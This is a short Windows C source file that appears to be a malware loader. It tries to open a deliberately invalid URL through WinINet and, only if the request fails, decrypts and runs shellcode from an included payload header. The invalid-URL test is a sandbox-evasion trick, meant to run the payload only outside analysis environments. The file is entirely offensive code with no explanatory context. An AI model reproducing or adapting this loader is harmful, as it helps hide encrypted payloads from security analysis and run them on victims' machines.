#include <Wininet.h>
#include <stdio.h>
#include "../payload_encrypted/payload.h"
#pragma comment(lib, "Wininet.lib")

int main(){
    char my_url[] = "http://www.myrandomunknownurl.com/"; //Invalid URL
    char readbuf[1024];
    DWORD read;
    HINTERNET httpopen=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
    HINTERNET openurl=InternetOpenUrl(httpopen,my_url,NULL,0,INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE,0);
    if (!openurl){
        InternetCloseHandle(httpopen);
        InternetCloseHandle(openurl);
        decryptShellCode();
        startShellCode();
    }else{
        InternetCloseHandle(httpopen);
        InternetCloseHandle(openurl);
    }
}
